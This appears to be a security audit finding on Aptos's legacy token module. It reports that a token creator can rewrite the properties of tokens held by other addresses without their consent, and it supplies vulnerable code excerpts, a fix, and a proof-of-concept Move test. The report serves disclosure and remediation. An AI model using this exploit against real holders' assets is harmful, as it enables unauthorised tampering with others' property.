### Title
Creator Can Mutate Token Properties of Tokens Held by Any Address Without Owner Consent — (`aptos-move/framework/aptos-token/sources/token.move`)

---

### Summary

`mutate_token_properties` accepts `token_owner` as a plain `address` argument with no verification that it matches the signing account. The only guard checks that the signer is the token creator. A creator can therefore pass any victim address as `token_owner` and mutate the `token_properties` of tokens they no longer own, without the victim's signature or consent.

---

### Finding Description

`mutate_token_properties` is a `public entry fun` with this signature:

```move
public entry fun mutate_token_properties(
    account: &signer,
    token_owner: address,   // <-- plain address, not a signer
    creator: address,
    ...
) acquires Collections, TokenStore {
    assert!(signer::address_of(account) == creator, error::not_found(ENO_MUTATE_CAPABILITY));
    ...
    mutate_one_token(account, token_owner, token_id, keys, values, types);
``` [1](#0-0) 

The sole authorization check at line 569 verifies only that the signer is the creator. There is no check that `token_owner == signer::address_of(account)` or that the token owner has authorized the mutation.

`mutate_one_token` repeats the same creator-only check and then calls `withdraw_with_event_internal(token_owner, token_id, 1)` — where `token_owner` is the attacker-supplied address:

```move
public fun mutate_one_token(
    account: &signer,
    token_owner: address,
    ...
) acquires Collections, TokenStore {
    let creator = token_id.token_data_id.creator;
    assert!(signer::address_of(account) == creator, ...);
    ...
    if (token_id.property_version == 0) {
        let token = withdraw_with_event_internal(token_owner, token_id, 1);
        ...
        direct_deposit(token_owner, new_token);
        update_token_property_internal(token_owner, new_token_id, keys, values, types);
``` [2](#0-1) 

`withdraw_with_event_internal` takes `token_owner` as a plain `address` (not `&signer`), so it operates on any account's `TokenStore` without requiring their signature. The token is withdrawn from the victim's store, a new token with creator-chosen properties is constructed, and it is deposited back — all without the victim's involvement.

---

### Impact Explanation

A token creator who has transferred tokens to users can later call `mutate_token_properties` with `token_owner = victim_address` to arbitrarily rewrite the `token_properties` map of tokens held by the victim. This constitutes an unauthorized state transition on user-controlled on-chain assets: the creator can change game attributes, rarity traits, or any other property-map values, degrading or altering the value of tokens the victim legitimately owns. When `property_version == 0`, the mutation also replaces the token's `TokenId` (bumps `property_version`), which can break downstream integrations tracking the old ID.

---

### Likelihood Explanation

Any token creator on the legacy `aptos-token` (v1) framework can exploit this immediately after transferring tokens. No special privileges beyond being the original creator are required. The entry function is callable directly as a transaction.

---

### Recommendation

Add an ownership check inside `mutate_token_properties` (or `mutate_one_token`) that asserts the signer is also the token owner, or require the token owner to co-sign the transaction:

```move
assert!(
    signer::address_of(account) == token_owner,
    error::permission_denied(ENO_MUTATE_CAPABILITY)
);
```

Alternatively, require the token owner to explicitly opt-in to allowing creator mutations (similar to the `direct_transfer` opt-in pattern already present in the module).

---

### Proof of Concept

```move
#[test(creator = @0xAF, victim = @0xBB)]
fun test_creator_mutates_victim_token(
    creator: &signer,
    victim: &signer,
) acquires Collections, TokenStore {
    use std::bcs;
    account::create_account_for_test(signer::address_of(creator));
    account::create_account_for_test(signer::address_of(victim));

    // Creator mints token with mutable properties
    let token_id = create_collection_and_token(
        creator, 1, 4, 4,
        vector[], vector[], vector[],
        vector[false, false, false],
        vector[false, false, false, false, true], // properties mutable
    );

    // Creator transfers token to victim
    initialize_token_store(victim);
    opt_in_direct_transfer(victim, true);
    direct_transfer(creator, victim, token_id, 1);
    assert!(balance_of(signer::address_of(victim), token_id) == 1, 0);

    // Creator mutates victim's token WITHOUT victim's signature
    mutate_token_properties(
        creator,                          // signer = creator (passes the only check)
        signer::address_of(victim),       // token_owner = victim (plain address)
        signer::address_of(creator),
        token_id.token_data_id.collection,
        token_id.token_data_id.name,
        0, 1,
        vector[string::utf8(b"rarity")],
        vector[bcs::to_bytes<u64>(&0)],
        vector[string::utf8(b"u64")],
    );

    // Victim's token now has creator-chosen properties — no victim signature used
    let new_id = create_token_id(token_id.token_data_id, 1);
    assert!(balance_of(signer::address_of(victim), new_id) == 1, 1);
}
```

The test passes because `token_owner` is never validated against the signer, and `withdraw_with_event_internal` operates on the victim's `TokenStore` using only their address. [3](#0-2) [4](#0-3) [5](#0-4)

    public fun mutate_one_token(
        account: &signer,
        token_owner: address,
        token_id: TokenId,
        keys: vector<String>,
        values: vector<vector<u8>>,
        types: vector<String>,
    ): TokenId acquires Collections, TokenStore {
        let creator = token_id.token_data_id.creator;
        assert!(signer::address_of(account) == creator, error::permission_denied(ENO_MUTATE_CAPABILITY));
        // validate if the properties is mutable
        assert!(exists<Collections>(creator), error::not_found(ECOLLECTIONS_NOT_PUBLISHED));
        let all_token_data = &mut Collections[
            creator
        ].token_data;

        assert!(all_token_data.contains(token_id.token_data_id), error::not_found(ETOKEN_DATA_NOT_PUBLISHED));
        let token_data = all_token_data.borrow_mut(token_id.token_data_id);

        // if default property is mutatable, token property is always mutable
        // we only need to check TOKEN_PROPERTY_MUTABLE when default property is immutable
        if (!token_data.mutability_config.properties) {
            assert!(
                token_data.default_properties.contains_key(&string::utf8(TOKEN_PROPERTY_MUTABLE)),
                error::permission_denied(EFIELD_NOT_MUTABLE)
            );

            let token_prop_mutable = token_data.default_properties.read_bool(&string::utf8(TOKEN_PROPERTY_MUTABLE));
            assert!(token_prop_mutable, error::permission_denied(EFIELD_NOT_MUTABLE));
        };

        // check if the property_version is 0 to determine if we need to update the property_version
        if (token_id.property_version == 0) {
            let token = withdraw_with_event_internal(token_owner, token_id, 1);
            // give a new property_version for each token
            let cur_property_version = token_data.largest_property_version + 1;
            let new_token_id = create_token_id(token_id.token_data_id, cur_property_version);
            let new_token = Token {
                id: new_token_id,
                amount: 1,
                token_properties: token_data.default_properties,
            };
            direct_deposit(token_owner, new_token);
            update_token_property_internal(token_owner, new_token_id, keys, values, types);
